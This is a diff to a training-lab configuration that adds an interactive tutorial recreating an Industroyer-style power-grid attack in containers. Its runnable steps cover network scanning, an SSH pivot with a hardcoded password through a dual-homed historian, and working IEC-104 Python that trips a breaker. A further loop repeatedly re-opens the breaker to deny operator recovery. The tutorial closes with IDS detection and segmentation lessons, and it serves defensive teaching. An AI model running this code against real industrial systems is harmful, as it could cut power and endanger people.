@@ -43,6 +43,13 @@
                 "ip": "10.0.5.10"
               },
               {
+                "id": "engws",
+                "name": "eng-ws",
+                "type": "workstation",
+                "image": "tollan/benign-client:latest",
+                "ip": "10.0.5.15"
+              },
+              {
                 "id": "historian",
                 "name": "historian",
                 "type": "database-server",
@@ -71,6 +78,11 @@
                 "id": "it-hist",
                 "from": "it-sw",
                 "to": "historian"
+              },
+              {
+                "id": "it-eng",
+                "from": "it-sw",
+                "to": "engws"
               }
             ]
           },
@@ -239,7 +251,7 @@
           {
             "id": "t-ics-h6",
             "kind": "markdown",
-            "source": "## 5 \u00b7 What the defender sees\n\nOn the **IDS**, Zeek's connection log shows the attack only as **plain TCP to port `2404`** \u2014 IEC-104 has no open protocol analyzer, so a breaker trip is indistinguishable from a routine poll. That blind spot *is* the lesson.\n\n> Needs Zeek already capturing on the OT SPAN mirror; if the log is empty, start Zeek on the IDS first (see the classroom walkthrough)."
+            "source": "## 5 \u00b7 What the defender sees\n\nOn the **IDS**, Zeek's connection log shows the attack only as **plain TCP to port `2404`** \u2014 this Zeek isn't decoding IEC-104, so it never sees *what* command was sent.\n\nIEC-104 analyzers for Zeek do exist, but even with one the open command is **well-formed and identical to authorized control** \u2014 telling malicious from legitimate needs **context** (who sent it, from where), not just protocol decoding. That is the real detection challenge.\n\n> Needs Zeek already capturing on the OT SPAN mirror; if the log is empty, start Zeek on the IDS first (see the classroom walkthrough)."
           },
           {
             "id": "t-ics-detect",
@@ -251,6 +263,155 @@
             "id": "t-ics-reset",
             "kind": "markdown",
             "source": "## Reset & go further\n\n- **Reset:** close the breaker again from the HMI, then `exit` the SSH session on the attacker terminal.\n- **Go further:** the *recovery-denial* loop (re-open on every operator close) is in `docs/ics-scenarios/scenario-b-classroom-walkthrough.md`.\n\nThe takeaway: no exploit, no malware \u2014 just reachability plus a legitimate protocol. Segmentation and OT-aware monitoring are what break this chain."
+          }
+        ]
+      },
+      {
+        "id": "tutorial-ics-industroyer-edu",
+        "title": "Industroyer, step by step",
+        "cells": [
+          {
+            "id": "edu-intro",
+            "kind": "markdown",
+            "source": "# Industroyer, step by step\n\nThis walkthrough recreates the kind of attack behind the 2016 Ukraine power-grid incident: an attacker in the **office network (IT)** reaches into the **plant network (OT \u2014 operational technology)** and trips a circuit **breaker**, cutting power.\n\nYou'll see it in four acts \u2014 **normal operations**, the **break-in**, **tripping the breaker**, and **loss of control**.\n\n> **Keep the breaker in view:** on the canvas, select the **`hmi`** node \u2192 **Open web UI**. The **HMI** (human-machine interface \u2014 the operator's screen) shows the breaker **CLOSED \u00b7 green** (power flowing). Watch it as you go; it turns **OPEN \u00b7 red** when the breaker trips."
+          },
+          {
+            "id": "edu-setup",
+            "kind": "markdown",
+            "source": "## 1 \u00b7 A segmented, monitored plant\n\nA **firewall** sits between the office and the plant and **blocks office\u2192plant traffic by default** \u2014 this is **network segmentation**. The administrator lets just one trusted machine through: the **engineering workstation (`eng-ws`)**. An **IDS** (intrusion detection system) quietly records plant traffic.\n\nRun the two setup steps."
+          },
+          {
+            "id": "edu-fw-allow",
+            "kind": "command",
+            "containerId": "fw",
+            "command": "nft insert rule inet filter forward ip saddr 10.0.5.15 ip daddr 10.0.3.0/24 accept\necho 'eng-ws (10.0.5.15) is now permitted through the firewall; everyone else stays blocked'\nnft list chain inet filter forward"
+          },
+          {
+            "id": "edu-zeek",
+            "kind": "command",
+            "containerId": "ids",
+            "command": "mkdir -p /root/zeeklogs && cd /root/zeeklogs\nnohup zeek -i eth0 -C >/tmp/zeek.out 2>&1 &\nsleep 1 && echo 'Zeek is now watching the plant network (logs in /root/zeeklogs)'"
+          },
+          {
+            "id": "edu-normal",
+            "kind": "markdown",
+            "source": "## 2 \u00b7 Normal operations\n\nThe breaker is controlled over **IEC-104**, a standard power-grid protocol (TCP port **2404**). The device that physically opens/closes it is the **RTU** (remote terminal unit) at `10.0.3.50`.\n\nAn authorized engineer, from **`eng-ws`**, sends control commands **through the firewall** to the RTU. Run the step and **watch the HMI**: the breaker opens, then closes again \u2014 ordinary, authorized control."
+          },
+          {
+            "id": "edu-engws-toggle",
+            "kind": "command",
+            "containerId": "engws",
+            "command": "/opt/venv/bin/python3 <<'PY'\nimport c104, time\nclient = c104.Client()\nconn = client.add_connection(ip=\"10.0.3.50\", port=2404)\nbreaker = conn.add_station(common_address=47).add_point(io_address=12, type=c104.Type.C_SC_NA_1)\nclient.start(); time.sleep(2)\nbreaker.value = False; breaker.transmit(cause=c104.Cot.ACTIVATION); print(\"maintenance: breaker OPEN\"); time.sleep(3)\nbreaker.value = True;  breaker.transmit(cause=c104.Cot.ACTIVATION); print(\"maintenance done: breaker CLOSED\")\nPY"
+          },
+          {
+            "id": "edu-recon",
+            "kind": "markdown",
+            "source": "## 3 \u00b7 The attacker breaks into the office\n\nThe attacker has taken over a machine on the office network (the **`attacker`** box). First question for any intruder: *where am I, and what else is here?*"
+          },
+          {
+            "id": "edu-whoami",
+            "kind": "command",
+            "containerId": "attacker",
+            "command": "hostname; ip -o -4 addr show | awk '{print $2, $4}'"
+          },
+          {
+            "id": "edu-scan",
+            "kind": "command",
+            "containerId": "attacker",
+            "command": "nmap -sn 10.0.5.0/24"
+          },
+          {
+            "id": "edu-blocked",
+            "kind": "markdown",
+            "source": "## 4 \u00b7 Blocked at the firewall\n\nThe attacker tries to reach the RTU's control port directly. The firewall **drops it** \u2014 this office box isn't the permitted `eng-ws`. So the attacker looks for a machine that sits in **both** networks."
+          },
+          {
+            "id": "edu-direct",
+            "kind": "command",
+            "containerId": "attacker",
+            "command": "nmap -Pn -p 2404 10.0.3.50"
+          },
+          {
+            "id": "edu-pivot",
+            "kind": "markdown",
+            "source": "## 5 \u00b7 Pivot through the historian\n\nThe **historian** (a server that logs plant data) is **dual-homed** \u2014 one network card in the office, one in the plant \u2014 so it can talk to both. It also reuses the office password. That makes it the perfect stepping stone."
+          },
+          {
+            "id": "edu-ssh",
+            "kind": "command",
+            "containerId": "attacker",
+            "command": "sshpass -p pass ssh -o StrictHostKeyChecking=no root@10.0.5.20"
+          },
+          {
+            "id": "edu-legs",
+            "kind": "command",
+            "containerId": "attacker",
+            "command": "hostname; ip -o -4 addr show | awk '{print $2, $4}'"
+          },
+          {
+            "id": "edu-reach",
+            "kind": "markdown",
+            "source": "## 6 \u00b7 Reach the RTU\n\nThis shell is now on the historian \u2014 **inside the plant network, past the firewall**. From here the RTU's control port is reachable: the segmentation has been defeated, not by breaking the firewall, but by going around it."
+          },
+          {
+            "id": "edu-probe",
+            "kind": "command",
+            "containerId": "attacker",
+            "command": "nmap -Pn -p 2404 10.0.3.50"
+          },
+          {
+            "id": "edu-trip",
+            "kind": "markdown",
+            "source": "## 7 \u00b7 Trip the breaker\n\nOne IEC-104 command opens the breaker (station **CA 47**, command point **12**; `False` = OPEN) \u2014 the *same kind* of command the operator sends, so nothing looks wrong on the wire.\n\n**Watch the HMI flip to OPEN \u00b7 red**, and `process-sim` (:8000) go dark. No operator did this."
+          },
+          {
+            "id": "edu-open",
+            "kind": "command",
+            "containerId": "attacker",
+            "command": "/opt/venv/bin/python3 <<'PY'\nimport c104, time\nclient = c104.Client()\nconn = client.add_connection(ip=\"10.0.3.50\", port=2404)\nbreaker = conn.add_station(common_address=47).add_point(io_address=12, type=c104.Type.C_SC_NA_1)\nclient.start(); time.sleep(2)\nbreaker.value = False; print(\"attacker OPEN ->\", breaker.transmit(cause=c104.Cot.ACTIVATION))\nPY"
+          },
+          {
+            "id": "edu-recover",
+            "kind": "markdown",
+            "source": "## 8 \u00b7 Recovery, then loss of control\n\nThe operator notices and restores power from **`eng-ws`**. It works \u2014 the breaker closes (green again). Normal recovery\u2026 for now."
+          },
+          {
+            "id": "edu-engws-close",
+            "kind": "command",
+            "containerId": "engws",
+            "command": "/opt/venv/bin/python3 <<'PY'\nimport c104, time\nclient = c104.Client()\nconn = client.add_connection(ip=\"10.0.3.50\", port=2404)\nbreaker = conn.add_station(common_address=47).add_point(io_address=12, type=c104.Type.C_SC_NA_1)\nclient.start(); time.sleep(2)\nbreaker.value = True; print(\"operator CLOSE ->\", breaker.transmit(cause=c104.Cot.ACTIVATION))\nPY"
+          },
+          {
+            "id": "edu-deny",
+            "kind": "markdown",
+            "source": "Now the attacker **denies recovery**: a short loop that re-opens the breaker the instant it closes. **This step keeps running until you press `Ctrl-C` in its terminal.**"
+          },
+          {
+            "id": "edu-retrip",
+            "kind": "command",
+            "containerId": "attacker",
+            "command": "/opt/venv/bin/python3 <<'PY'\nimport c104, time\nclient = c104.Client()\nconn = client.add_connection(ip=\"10.0.3.50\", port=2404)\nst = conn.add_station(common_address=47)\nstate = st.add_point(io_address=11, type=c104.Type.M_SP_NA_1)\ncmd   = st.add_point(io_address=12, type=c104.Type.C_SC_NA_1)\nclient.start(); time.sleep(2)\ncmd.value = False; cmd.transmit(cause=c104.Cot.ACTIVATION)\nprint(\"denying recovery - press Ctrl-C to stop\")\nwhile True:\n    conn.interrogation(common_address=47); time.sleep(0.5)\n    if state.value is True:\n        cmd.value = False; cmd.transmit(cause=c104.Cot.ACTIVATION)\n        print(\"operator closed -> re-OPENED\")\nPY"
+          },
+          {
+            "id": "edu-lost",
+            "kind": "markdown",
+            "source": "With that loop running, have the operator try again \u2014 **re-run the `eng-ws` Close step** (click \u25b6 on it). The breaker snaps straight back to **OPEN**: the operator has **lost control** of the breaker. This is the Industroyer effect.\n\nWhen you've seen it, press **Ctrl-C** in the attacker's re-trip terminal to stop."
+          },
+          {
+            "id": "edu-detect",
+            "kind": "markdown",
+            "source": "## 9 \u00b7 What the defender saw\n\nOn the **IDS**, the connection log shows the whole attack only as **plain TCP to port 2404** \u2014 this Zeek has no IEC-104 analyzer loaded, so it can't see *what* command was sent.\n\nAnd here's the sharper point: even **with** an IEC-104 parser, the trip is a perfectly valid command \u2014 identical to what an operator sends. Telling the attack apart from normal control needs **context** \u2014 *who* sent it and *from where* \u2014 not just reading the protocol. That's what makes OT attacks hard to catch."
+          },
+          {
+            "id": "edu-conn",
+            "kind": "command",
+            "containerId": "ids",
+            "command": "echo \"Connections seen to the RTU control port (2404):\"\ngrep -v '^#' /root/zeeklogs/conn.log 2>/dev/null | awk '$6==2404 {print \"  \"$3\" -> \"$5\":2404   proto=\"$7\"   service=\"$8}' | tail"
+          },
+          {
+            "id": "edu-recap",
+            "kind": "markdown",
+            "source": "## Reset & recap\n\n**Reset:** press `Ctrl-C` in the attacker's re-trip terminal, re-run the `eng-ws` **Close** step, then `exit` the historian shell.\n\n**What this taught:**\n- Segmentation (the firewall) is essential \u2014 but a **dual-homed host** (the historian) quietly defeated it.\n- The attack used **legitimate protocol commands**, so it looked normal.\n- **Detection is hard**: even decoded, the command is valid \u2014 flagging it needs context (who sent it, from where).\n\nDefenses: no dual-homed bridges across the IT/OT boundary, least privilege, and context-aware (not just protocol-aware) monitoring."
           }
         ]
       }
